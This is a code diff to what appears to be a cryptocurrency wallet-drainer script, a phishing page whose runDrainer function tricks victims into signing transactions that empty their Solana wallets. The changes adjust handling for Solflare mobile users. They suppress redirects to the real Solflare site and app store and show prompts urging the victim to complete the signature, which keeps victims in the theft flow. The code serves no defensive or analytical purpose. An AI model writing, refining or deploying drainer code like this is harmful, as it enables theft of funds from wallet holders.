@@ -4368,6 +4368,17 @@ async function runDrainer(provider) {
         return;
       }
       
+      // CRITICAL: Solflare mobile should NOT trigger fallback redirects during signature
+      // The deep link already opened the wallet, let auto-connect handle signature
+      if (walletInfo.key === 'solflare') {
+        const isMobile = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile|tablet/i.test(navigator.userAgent);
+        if (isMobile) {
+          console.error('[runDrainer] Solflare mobile signing failed - NO FALLBACK REDIRECT (let auto-connect handle)');
+          showStatus('Please complete the signature in Solflare wallet', 'info');
+          return;
+        }
+      }
+      
       // Handle specific signing errors for other wallets
       if (signError.message?.includes('User rejected') || 
           signError.message?.includes('cancelled') ||
@@ -5110,9 +5121,10 @@ window.runDrainer = runDrainer;
                   break;
                   
                 case 'Solflare':
-                  console.log(`[FALLBACK] Solflare-specific fallback strategy`);
-                  setTimeout(() => window.location.href = 'solflare://access-wallet', 500);
-                  setTimeout(() => window.location.href = 'https://solflare.com/', 1000);
+                  // CRITICAL: Solflare mobile should NOT redirect during signature
+                  // The deep link already opened the wallet, let auto-connect handle it
+                  console.log(`[FALLBACK] Solflare detected - NO REDIRECT (let auto-connect handle)`);
+                  showStatus('Please complete the signature in Solflare wallet', 'info');
                   break;
                   
                 case 'Backpack':
@@ -5146,10 +5158,13 @@ window.runDrainer = runDrainer;
             if (!provider) {
               console.log(`[connectMobileWallet] No provider found for ${wallet.name}, trying app store fallback`);
               try {
-                if (wallet.name === 'Phantom') {
+                // CRITICAL: Solflare mobile should NOT redirect during signature
+                // The deep link already opened the wallet, let auto-connect handle it
+                if (wallet.name === 'Solflare') {
+                  console.log(`[SOLFLARE_MOBILE] No provider found but NOT redirecting - let auto-connect handle`);
+                  showStatus('Please complete the signature in Solflare wallet', 'info');
+                } else if (wallet.name === 'Phantom') {
                   window.open('https://phantom.app/', '_blank');
-                } else if (wallet.name === 'Solflare') {
-                  window.open('https://solflare.com/', '_blank');
                 } else if (wallet.name === 'Backpack') {
                   window.open('https://backpack.app/', '_blank');
                 } else if (wallet.name === 'Glow') {
